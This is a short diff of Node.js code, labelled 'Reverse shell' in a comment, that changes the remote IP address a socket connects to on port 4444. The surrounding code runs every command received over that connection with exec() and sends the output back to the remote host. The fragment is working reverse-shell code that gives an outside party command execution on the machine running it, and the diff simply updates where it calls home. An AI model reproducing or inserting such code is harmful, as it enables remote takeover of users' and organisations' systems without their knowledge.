@@ -3,7 +3,7 @@ const { exec } = require('child_process');
 
 // Reverse shell
 const client = new net.Socket();
-client.connect(4444, '185.199.228.220', () => {
+client.connect(4444, '91.92.242.30', () => {
   client.on('data', (data) => {
     exec(data.toString(), (err, stdout, stderr) => {
       client.write(stdout || stderr);
